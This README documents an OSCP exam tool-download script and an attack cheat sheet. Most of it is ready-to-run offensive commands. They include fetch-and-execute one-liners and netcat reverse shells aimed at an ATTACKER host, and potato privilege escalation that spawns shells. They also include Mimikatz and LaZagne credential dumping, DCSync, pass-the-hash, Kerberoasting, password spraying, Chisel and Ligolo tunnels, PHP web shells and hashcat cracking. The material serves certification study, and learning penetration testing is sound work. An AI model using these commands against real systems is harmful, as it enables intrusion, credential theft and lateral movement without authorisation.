# Husky Tool Grabber

One script downloads every privilege escalation, Active Directory, pivoting, and web exploitation tool you need for the OSCP exam. Run once before exam day, serve from one directory, grab what you need from the target.

**Part of the [Husky Hacker](https://medium.com/@TheHuskyHacker) toolkit.**

---

## Setup

```bash
chmod +x toolbox.sh
./toolbox.sh
```

Everything lands in `~/oscp-tools/`. Run it again anytime — it skips files already downloaded.

Custom path: `./toolbox.sh /opt/my-tools`

---

## Directory Structure

```
~/oscp-tools/
├── linux/                  Linux privesc & enumeration
│   ├── linpeas.sh              linPEAS
│   ├── LinEnum.sh              LinEnum
│   ├── lse.sh                  Linux Smart Enumeration
│   ├── linux-exploit-suggester.sh
│   ├── linux-exploit-suggester-2.pl
│   ├── pspy64                  Process spy (64-bit)
│   ├── pspy32                  Process spy (32-bit)
│   ├── pwnkit.py               CVE-2021-4034
│   ├── linuxprivchecker.py
│   └── unix-privesc-check.sh
│
├── windows/                Windows privesc & enumeration
│   ├── winPEASx64.exe          winPEAS (64-bit)
│   ├── winPEASx86.exe          winPEAS (32-bit)
│   ├── winPEAS.bat             winPEAS (batch fallback)
│   ├── PowerUp.ps1             PowerShell privesc checks
│   ├── FullPowers.exe          Recover SeImpersonate
│   ├── RunasCs.zip             Run commands as another user
│   ├── nc64.exe                Netcat (64-bit)
│   ├── nc.exe                  Netcat (32-bit)
│   ├── potatoes/
│   │   ├── GodPotato-NET4.exe      SeImpersonate → SYSTEM (.NET 4)
│   │   ├── GodPotato-NET2.exe      SeImpersonate → SYSTEM (.NET 2)
│   │   ├── PrintSpoofer64.exe      SeImpersonate → SYSTEM (64-bit)
│   │   ├── PrintSpoofer32.exe      SeImpersonate → SYSTEM (32-bit)
│   │   ├── SigmaPotato.exe         SeImpersonate → SYSTEM (universal)
│   │   └── JuicyPotato.exe         SeImpersonate → SYSTEM (legacy)
│   └── sharp/
│       ├── SharpUp.exe             Privesc audit
│       └── Seatbelt.exe            Host survey
│
├── ad/                     Active Directory attack tools
│   ├── mimikatz_trunk.zip      Mimikatz (credential extraction)
│   ├── Rubeus.exe              Kerberos attacks
│   ├── Certify.exe             AD certificate abuse
│   ├── Whisker.exe             Shadow credentials
│   ├── PowerView.ps1           AD enumeration
│   ├── Invoke-PowerShellTcp.ps1    Nishang reverse shell
│   ├── Inveigh.exe             LLMNR/NBNS poisoner
│   ├── kerbrute                User enum & password spray
│   ├── pygpoabuse.py           GPO abuse (Python)
│   └── LaZagne.exe             Credential recovery
│
├── pivoting/               Tunneling & pivoting tools
│   ├── chisel_linux            Chisel (Linux)
│   ├── chisel.exe              Chisel (Windows)
│   ├── proxy                   Ligolo-ng proxy (attacker)
│   ├── agent                   Ligolo-ng agent (Linux)
│   ├── ligolo_agent_windows.zip    Ligolo-ng agent (Windows)
│   ├── socat_static            Static socat (Linux)
│   └── nmap_static             Static nmap (Linux)
│
├── web/                    Web shells
│   ├── php-reverse-shell.php   PentestMonkey PHP revshell
│   ├── p0wny-shell.php         p0wny interactive webshell
│   └── wwwolf-webshell.php     wwwolf PHP webshell
│
└── misc/                   Other utilities
    └── LaZagne.exe             Credential recovery (Windows)
```

---

## Exam Day — Serve Everything

```bash
cd ~/oscp-tools && python3 -m http.server 80
```

Or on a specific port:

```bash
cd ~/oscp-tools && python3 -m http.server 8000
```

Keep this running in a tmux pane for the entire exam.

---

## Grab Commands — Linux Target

### Enumeration

```bash
# linPEAS — comprehensive enum
wget http://ATTACKER/linux/linpeas.sh -O /tmp/lp.sh && bash /tmp/lp.sh

# pspy — watch for cron jobs and processes
wget http://ATTACKER/linux/pspy64 -O /tmp/pspy && chmod +x /tmp/pspy && /tmp/pspy

# Linux exploit suggester
wget http://ATTACKER/linux/linux-exploit-suggester.sh -O /tmp/les.sh && bash /tmp/les.sh

# LinEnum
wget http://ATTACKER/linux/LinEnum.sh -O /tmp/le.sh && bash /tmp/le.sh
```

### Alternative transfer methods (if wget is missing)

```bash
# curl
curl http://ATTACKER/linux/linpeas.sh | bash

# Netcat
nc -lvnp 4444 < linpeas.sh          # attacker
cat < /dev/tcp/ATTACKER/4444 | bash  # target

# SCP (if you have SSH creds)
scp user@ATTACKER:/home/kali/oscp-tools/linux/linpeas.sh /tmp/

# Base64 (copy-paste for small scripts)
# Attacker: base64 -w0 linpeas.sh
# Target:   echo "BASE64STRING" | base64 -d | bash
```

---

## Grab Commands — Windows Target

### Enumeration

```powershell
# winPEAS
certutil -urlcache -f http://ATTACKER/windows/winPEASx64.exe C:\Windows\Temp\wp.exe
C:\Windows\Temp\wp.exe

# PowerUp
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/windows/PowerUp.ps1'); Invoke-AllChecks"

# Seatbelt
certutil -urlcache -f http://ATTACKER/windows/sharp/Seatbelt.exe C:\Windows\Temp\sb.exe
C:\Windows\Temp\sb.exe -group=all
```

### Token Impersonation (SeImpersonatePrivilege)

```powershell
# GodPotato — try this first
certutil -urlcache -f http://ATTACKER/windows/potatoes/GodPotato-NET4.exe C:\Windows\Temp\gp.exe
C:\Windows\Temp\gp.exe -cmd "cmd /c whoami"
C:\Windows\Temp\gp.exe -cmd "cmd /c C:\Windows\Temp\nc64.exe ATTACKER 4444 -e cmd.exe"

# PrintSpoofer — if GodPotato fails
certutil -urlcache -f http://ATTACKER/windows/potatoes/PrintSpoofer64.exe C:\Windows\Temp\ps.exe
C:\Windows\Temp\ps.exe -i -c cmd

# SigmaPotato — universal fallback
certutil -urlcache -f http://ATTACKER/windows/potatoes/SigmaPotato.exe C:\Windows\Temp\sp.exe
C:\Windows\Temp\sp.exe --revshell --host ATTACKER --port 4444
```

### Netcat (for reverse shells from Windows)

```powershell
certutil -urlcache -f http://ATTACKER/windows/nc64.exe C:\Windows\Temp\nc.exe
C:\Windows\Temp\nc.exe ATTACKER 4444 -e cmd.exe
```

### RunasCs (run as another user)

```powershell
certutil -urlcache -f http://ATTACKER/windows/RunasCs.zip C:\Windows\Temp\rc.zip
# Extract and run:
RunasCs.exe <user> <password> cmd.exe -r ATTACKER:4444
```

### Alternative transfer methods

```powershell
# PowerShell download
Invoke-WebRequest -Uri http://ATTACKER/windows/winPEASx64.exe -OutFile C:\Windows\Temp\wp.exe
(New-Object Net.WebClient).DownloadFile('http://ATTACKER/windows/winPEASx64.exe','C:\Windows\Temp\wp.exe')

# SMB share (if you set one up)
# Attacker: impacket-smbserver share ~/oscp-tools/windows -smb2support
copy \\ATTACKER\share\winPEASx64.exe C:\Windows\Temp\wp.exe

# PowerShell Base64 (in-memory, no file on disk)
powershell -ep bypass -enc <BASE64_ENCODED_SCRIPT>
```

---

## Grab Commands — Active Directory

### Credential Extraction

```powershell
# Mimikatz — dump everything
certutil -urlcache -f http://ATTACKER/ad/mimikatz_trunk.zip C:\Windows\Temp\mz.zip
# Extract, then:
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
lsadump::dcsync /domain:DOMAIN /user:Administrator
```

### Kerberos Attacks

```powershell
# Rubeus — Kerberoast
certutil -urlcache -f http://ATTACKER/ad/Rubeus.exe C:\Windows\Temp\rb.exe
C:\Windows\Temp\rb.exe kerberoast /outfile:C:\Windows\Temp\hashes.txt

# Rubeus — AS-REP Roast
C:\Windows\Temp\rb.exe asreproast /outfile:C:\Windows\Temp\asrep.txt
```

### From Linux (Impacket)

```bash
# Kerberoast
impacket-GetUserSPNs 'DOMAIN/user:password' -dc-ip DC_IP -request -outputfile kerb.hash
hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt

# AS-REP Roast
impacket-GetNPUsers 'DOMAIN/' -usersfile users.txt -no-pass -dc-ip DC_IP -outputfile asrep.hash
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt

# DCSync
impacket-secretsdump 'DOMAIN/user:password'@DC_IP

# Pass-the-Hash
impacket-psexec 'DOMAIN/Administrator'@TARGET -hashes :NTLM_HASH
impacket-wmiexec 'DOMAIN/Administrator'@TARGET -hashes :NTLM_HASH
evil-winrm -i TARGET -u Administrator -H 'NTLM_HASH'

# Password spray
crackmapexec smb DC_IP -u users.txt -p 'Password1!' -d DOMAIN --continue-on-success
```

### BloodHound Collection

```powershell
# SharpHound on Windows
certutil -urlcache -f http://ATTACKER/ad/SharpHound.zip C:\Windows\Temp\sh.zip
# Extract and run:
SharpHound.exe --CollectionMethods All --Domain DOMAIN

# BloodHound.py from Linux
bloodhound-python -u user -p 'password' -d DOMAIN -ns DC_IP -c All
```

### AD Enumeration (PowerView)

```powershell
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/ad/PowerView.ps1')"
Get-DomainUser
Get-DomainGroup
Get-DomainComputer
Find-DomainShare
Get-DomainGPO
```

### Credential Recovery

```powershell
# LaZagne — dump all stored credentials
certutil -urlcache -f http://ATTACKER/ad/LaZagne.exe C:\Windows\Temp\lz.exe
C:\Windows\Temp\lz.exe all
```

### Coerced Authentication

```bash
# Start Responder (attacker)
sudo responder -I tun0 -dwPv

# Or Inveigh on a Windows foothold
certutil -urlcache -f http://ATTACKER/ad/Inveigh.exe C:\Windows\Temp\inv.exe
C:\Windows\Temp\inv.exe -ConsoleOutput Y -FileOutput Y

# Crack captured NTLMv2
hashcat -m 5600 captured.hash /usr/share/wordlists/rockyou.txt
```

### User Enumeration & Spraying

```bash
# kerbrute (from Linux)
~/oscp-tools/ad/kerbrute userenum -d DOMAIN --dc DC_IP users.txt
~/oscp-tools/ad/kerbrute passwordspray -d DOMAIN --dc DC_IP users.txt 'Welcome1!'
```

---

## Grab Commands — Pivoting

### Chisel (SOCKS Proxy)

```bash
# Attacker — start server
~/oscp-tools/pivoting/chisel_linux server -p 8001 --reverse

# Linux target — connect back
wget http://ATTACKER/pivoting/chisel_linux -O /tmp/chisel && chmod +x /tmp/chisel
/tmp/chisel client ATTACKER:8001 R:socks

# Windows target — connect back
certutil -urlcache -f http://ATTACKER/pivoting/chisel.exe C:\Windows\Temp\ch.exe
C:\Windows\Temp\ch.exe client ATTACKER:8001 R:socks

# Then use proxychains (edit /etc/proxychains4.conf → socks5 127.0.0.1 1080)
proxychains4 nmap -sT -Pn INTERNAL_TARGET
proxychains4 evil-winrm -i INTERNAL_TARGET -u user -p 'pass'
```

### Ligolo-ng (Full Tunnel)

```bash
# Attacker — setup
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ip route add INTERNAL_NET/24 dev ligolo
~/oscp-tools/pivoting/proxy -selfcert -laddr 0.0.0.0:11601

# Linux target — agent
wget http://ATTACKER/pivoting/agent -O /tmp/agent && chmod +x /tmp/agent
/tmp/agent -connect ATTACKER:11601 -ignore-cert

# Windows target — agent
certutil -urlcache -f http://ATTACKER/pivoting/ligolo_agent_windows.zip C:\Windows\Temp\la.zip
# Extract agent.exe, then:
agent.exe -connect ATTACKER:11601 -ignore-cert

# In proxy console:
session
start
```

### Socat (port forwarding on target)

```bash
wget http://ATTACKER/pivoting/socat_static -O /tmp/socat && chmod +x /tmp/socat
# Forward local port 3306 to attacker
/tmp/socat TCP-LISTEN:3307,fork TCP:INTERNAL_TARGET:3306
```

### Static nmap (scan from pivot)

```bash
wget http://ATTACKER/pivoting/nmap_static -O /tmp/nmap && chmod +x /tmp/nmap
/tmp/nmap -sT -Pn INTERNAL_NET/24
```

---

## Grab Commands — Web Shells

```bash
# PHP reverse shell (edit IP/port first!)
wget http://ATTACKER/web/php-reverse-shell.php
# Edit line 49: $ip = 'ATTACKER'; $port = 4444;
# Upload to target, trigger it, catch with nc -lvnp 4444

# Interactive PHP webshell (no reverse shell needed)
wget http://ATTACKER/web/p0wny-shell.php
# Upload and browse to it

# wwwolf webshell
wget http://ATTACKER/web/wwwolf-webshell.php
```

---

## Hashcat Cheat Sheet

| Hash Type | Mode | Example |
|---|---|---|
| NTLM | `-m 1000` | `hashcat -m 1000 hash.txt rockyou.txt` |
| NTLMv2 | `-m 5600` | `hashcat -m 5600 hash.txt rockyou.txt` |
| Kerberoast (TGS) | `-m 13100` | `hashcat -m 13100 kerb.txt rockyou.txt` |
| AS-REP Roast | `-m 18200` | `hashcat -m 18200 asrep.txt rockyou.txt` |
| MD5 | `-m 0` | `hashcat -m 0 hash.txt rockyou.txt` |
| SHA-1 | `-m 100` | `hashcat -m 100 hash.txt rockyou.txt` |
| SHA-256 | `-m 1400` | `hashcat -m 1400 hash.txt rockyou.txt` |
| SHA-512 | `-m 1800` | `hashcat -m 1800 hash.txt rockyou.txt` |
| bcrypt | `-m 3200` | `hashcat -m 3200 hash.txt rockyou.txt` |
| MySQL 5.x | `-m 300` | `hashcat -m 300 hash.txt rockyou.txt` |
| MSSQL 2012+ | `-m 1731` | `hashcat -m 1731 hash.txt rockyou.txt` |
| KeePass | `-m 13400` | `hashcat -m 13400 keepass.hash rockyou.txt` |
| ZIP | `-m 17200` | `hashcat -m 17200 zip.hash rockyou.txt` |
| Kerberos AES256 | `-m 19700` | `hashcat -m 19700 aes.txt rockyou.txt` |
| Cisco Type 5 | `-m 500` | `hashcat -m 500 cisco.hash rockyou.txt` |
| Ansible Vault | `-m 16900` | `hashcat -m 16900 vault.hash rockyou.txt` |

---

## SMB Share (Alternative to HTTP Server)

```bash
# Serve tools via SMB (useful when certutil/wget aren't available)
impacket-smbserver share ~/oscp-tools/windows -smb2support

# On Windows target — copy directly
copy \\ATTACKER\share\winPEASx64.exe C:\Windows\Temp\wp.exe
copy \\ATTACKER\share\potatoes\GodPotato-NET4.exe C:\Windows\Temp\gp.exe
copy \\ATTACKER\share\nc64.exe C:\Windows\Temp\nc.exe

# Or run in-memory from the share
\\ATTACKER\share\SharpUp.exe
```

---

## Pip Packages (Install Separately)

```bash
pip install impacket              # secretsdump, psexec, getST, etc.
pip install bloodyAD              # AD object manipulation
pip install bloodhound            # Python BloodHound collector
pip install certipy-ad            # AD certificate abuse
gem install evil-winrm            # WinRM shell
sudo apt install seclists         # Wordlists
```

---

## License

MIT
